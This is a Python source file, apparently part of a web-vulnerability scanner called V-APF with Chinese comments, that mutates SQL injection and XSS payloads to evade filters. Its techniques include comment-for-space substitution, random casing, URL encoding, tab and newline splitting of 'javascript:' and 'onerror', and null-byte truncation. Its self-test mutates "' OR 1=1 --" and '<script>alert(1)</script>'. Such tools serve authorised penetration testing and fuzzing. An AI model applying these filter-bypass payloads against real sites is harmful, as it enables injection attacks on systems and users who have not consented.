import random
import urllib.parse
import re

class SAFSMutator:
    """
    V-APF 高级变异引擎
    功能：根据漏洞类型 (SQLi, XSS, Generic) 进行针对性的 Payload 混淆与变异。
    """
    def __init__(self):
        # 针对不同漏洞类型的变异策略库
        self.strategies = {
            "sqli": [
                lambda p: p.replace(" ", "/**/"),            # 空格变注释
                lambda p: p.replace(" ", "+"),               # 空格变加号
                lambda p: p.replace("OR", "||").replace("AND", "&&"), # 逻辑符替换 (MySQL/PgSQL)
                lambda p: "".join([c.upper() if random.random() > 0.5 else c.lower() for c in p]), # 随机大小写混淆
                lambda p: p.replace("'", "''").replace("\"", "\\\""), # 符号重叠/转义尝试
                lambda p: p.replace("=", " like "),          # 替换等号
                lambda p: f"/*{random.randint(1000,9999)}*/" + p # 前置注释干扰
            ],
            "xss": [
                lambda p: p.replace("<script>", "<sCrIpT>"), # 标签大小写混淆
                lambda p: p.replace("alert", "prompt"),      # 函数替换
                lambda p: p.replace("alert", "confirm"),
                lambda p: urllib.parse.quote(p),             # URL 编码
                lambda p: p.replace(">", "//>"),             # 闭合绕过
                lambda p: p.replace("javascript:", "java\tscript:"), # 协议绕过
                lambda p: p.replace("onerror", "on\nerror")  # 事件绕过
            ],
            "generic": [
                lambda p: p + " #",                          # 注释截断
                lambda p: p + " -- ", 
                lambda p: p + "%00",                         # 空字节截断
                lambda p: urllib.parse.quote(p),             # 全量 URL 编码
                lambda p: p + " " * random.randint(1, 5)     # 尾部随机空格
            ]
        }

    def mutate(self, base_payload, count=3):
        """
        根据原始 Payload 的关键词判断类型，并生成 N 个变体
        """
        mutants = {base_payload}
        
        # 1. 识别类型
        p_type = "generic"
        lower_p = base_payload.lower()
        if any(kw in lower_p for kw in ["select", " union", " or ", " and ", "sleep(", "benchmark"]):
            p_type = "sqli"
        elif any(kw in lower_p for kw in ["script", "alert", "img", "iframe", "svg", "onload", "onerror"]):
            p_type = "xss"

        # 2. 执行变异
        available_strategies = self.strategies.get(p_type, self.strategies["generic"])
        
        # 尝试生成指定数量的变体
        max_attempts = count * 10
        while len(mutants) < count + 1 and max_attempts > 0:
            strategy = random.choice(available_strategies)
            try:
                # 随机选择一个已有的（可能是原版，也可能是已变异的）进行再次变异，实现叠加效果
                # 但为了控制混乱度，我们还是主要基于 base_payload 变异
                # 或者有一定概率基于已变异的进行二阶变异
                source = base_payload
                if random.random() > 0.7 and len(mutants) > 1:
                     source = random.choice(list(mutants))
                
                new_p = strategy(source)
                if new_p:
                    mutants.add(new_p)
            except Exception:
                pass
            max_attempts -= 1
            
        return list(mutants)

# 兼容旧代码引用，虽然建议更新调用方
PayloadMutator = SAFSMutator

if __name__ == "__main__":
    # 测试代码
    mutator = SAFSMutator()
    
    sqli_payload = "' OR 1=1 --"
    print(f"\n[SQLi Test] Base: {sqli_payload}")
    for i, v in enumerate(mutator.mutate(sqli_payload, count=3)):
        print(f"Variant {i+1}: {v}")
        
    xss_payload = "<script>alert(1)</script>"
    print(f"\n[XSS Test] Base: {xss_payload}")
    for i, v in enumerate(mutator.mutate(xss_payload, count=3)):
        print(f"Variant {i+1}: {v}")
